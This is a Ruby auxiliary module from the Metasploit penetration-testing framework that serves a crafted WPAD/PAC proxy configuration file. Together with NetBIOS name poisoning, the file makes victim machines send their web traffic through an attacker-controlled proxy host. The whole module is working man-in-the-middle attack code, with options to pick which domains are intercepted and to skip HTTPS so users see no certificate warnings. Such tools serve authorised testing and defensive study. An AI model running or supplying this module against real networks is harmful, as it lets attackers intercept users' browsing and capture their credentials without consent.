##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'WPAD/PAC Proxy Config Server',
			'Description'	=> %q{
				This module facilitates serving up a preconfigured WPAD.DAT
				file.  This is useful when using the nbns_response module
				to configure clients to use a specified proxy.
				
				If DEFUALT is set to 'BYPASS' DOMAINS is a list of domains
				that the victim will redirect to the proxy.  If DEFAULT is
				set to 'INTERCEPT' DOMAINS is a list of domains that the victim
				will not send through the proxy.
				
				The SKIPSSL option can be used to not intercept sites using
				HTTPS, this is useful for avoiding invalid certificate errors.
			},
			'Author'		=> 
				[
					'Spencer McIntyre',
					'SecureState R&I Team',	# SecureState Research and Innovation Team
				],
			'License'		=> MSF_LICENSE,
			'DefaultOptions' =>
				{
					'SRVPORT' => 80,
					'URIPATH' => '/wpad.dat'
				},
			'Actions'     =>
				[
					[ 'Service' ]
				],
			'PassiveActions' => [ 'Service' ],
			'DefaultAction'  => 'Service'
		))
		deregister_options('SSL', 'SSLCert', 'SSLVersion', 'URIPATH')
		register_options(
			[
				OptString.new('PROXYHOST',  [ true, 'Host for victims to use as a proxy', nil ]),
				OptInt.new('PROXYPORT', [ true, 'Port for victims to use as a proxy', 8080 ]),
				OptString.new('DOMAINS', [ false, 'Comma seperated list of domains to handle differently', '' ]),
				OptString.new('DEFAULT', [ false, 'Default action for domains not specified (INTERCEPT or BYPASS)', 'INTERCEPT']),
				OptBool.new('SKIPSSL', [ true, 'Do not proxy requests for HTTPS resources', true ]),
			], self.class)
	end

	def run
		default = datastore['DEFAULT'].upcase
		if (default != 'INTERCEPT') and (default != 'BYPASS')
			print_error("DEFAULT must be either INTERCEPT or BYPASS")
			return
		end
		@wpad_data = create_wpad_file(datastore['PROXYHOST'], datastore['PROXYPORT'], datastore['DOMAINS'], default, datastore['SKIPSSL'])
		exploit
	end
	
	# Handle incoming requests from the server
	def on_request_uri(cli, request)
		send_response(cli, @wpad_data, { 'Content-Type' => "application/x-ns-proxy-autoconfig" } )
	end
	
	def create_wpad_file(proxy_server, proxy_port, domains, default, skipssl)
		if domains == nil
			domains = []
		else
			domains = domains.split(',')
		end
		if default == "INTERCEPT"
			non_default = "DIRECT"
		else
			non_default = "PROXY #{proxy_server}:#{proxy_port}"
		end
		
		wpad =  "function FindProxyForURL(url, host)\n"
		wpad << "{\n"
		if skipssl
			wpad << "if (url.substring(0, 6) == \"https:\") { return \"DIRECT\"; }\n"
		end
		
		for domain in domains
			wpad << "if (dnsDomainIs(host, \"#{domain}\")) { return \"#{non_default}\"; }\n"
		end
		
		if default == "INTERCEPT"
			wpad << "return \"PROXY #{proxy_server}:#{proxy_port}\";\n"
		else
			wpad << "return \"DIRECT\";\n"
		end
		wpad << "}\n"
		wpad
	end
end
